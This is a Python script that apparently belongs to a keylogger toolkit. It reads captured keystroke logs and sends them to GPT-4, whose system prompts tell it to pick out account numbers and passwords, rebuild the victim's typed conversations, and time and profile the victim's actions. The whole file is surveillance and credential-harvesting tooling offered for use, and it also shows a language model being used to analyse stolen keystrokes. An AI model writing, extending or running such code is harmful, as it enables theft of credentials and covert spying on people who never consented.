from openai import OpenAI
from transformers import GPT2Tokenizer

openai_api_key = 'your openai api key'


def split_text(text, max_tokens=8000):
    tokenizer = GPT2Tokenizer.from_pretrained("gpt2")
    tokens = tokenizer.encode(text)
    chunks = [tokens[i:i + max_tokens] for i in range(0, len(tokens), max_tokens)]
    return [tokenizer.decode(chunk) for chunk in chunks]

def ask_ai():
    output = open("./bin/keylogger_processed_output.log", "w")
    with open("./bin/keylogger.log", 'r', encoding='utf-8') as file:
    
        message = file.read()
        client = OpenAI(
		    api_key=openai_api_key
	    )
        
        chunks = split_text(message)
        responses = []

        for chunk in chunks:
            answer = client.chat.completions.create(
		        messages=[
        	        {"role": "system", "content": "You are an helpful assistant and a keylogger analyzer. Based on the keylogger output after the first time you see VK_LBUTTON key, you need to summary what user did, highlight important information, like account and password, restore conversation contents if needed, predict user's action separated by time interval, and analyze user's actions. You also need to pay attention to the combination of letters, signs, and number, which can be account number and password. This is what you need to highlight. Moreover, you need to highlight the number of time user spent on specific or general types of actions. Additionally, you need to try your best to restore the conversation. When you see VK_BACK key, you delete one letter. When you see VK_SHIFT key, you capitalize the next one key. These two rules only work for conversation restore."},
        	        {"role": "user", "content": chunk},
    	        ],
		        model="gpt-4"
	        ) 
            responses.append(answer.choices[0].message.content)

        full_response = "".join(responses)
        output.write(full_response)
    
    output.write("Start key only summary------------------------------------------------------------------------\n")
    with open("./bin/key_assemble.log", "r", encoding='utf-8') as file:
        message = file.read()
        client = OpenAI(
		    api_key=openai_api_key
	    )
        chunks = split_text(message)
        responses = []

        for chunk in chunks:
            answer = client.chat.completions.create(
		        messages=[
        	        {"role": "system", "content": "You are an helpful assistant and a keylogger analyzer. You need to try your best to restore and extract potential conversation from the message you got and summarize the contents of the conversation. If the input message does not look like a conversation, you need to say it and there is no need to restore conversation anymore."},
        	        {"role": "user", "content": chunk},
    	        ],
		        model="gpt-4"
	        ) 
            responses.append(answer.choices[0].message.content)

        full_response = "".join(responses)
        output.write(full_response)
        
    output.close()

def main():
    ask_ai()

if __name__ == "__main__":
    main()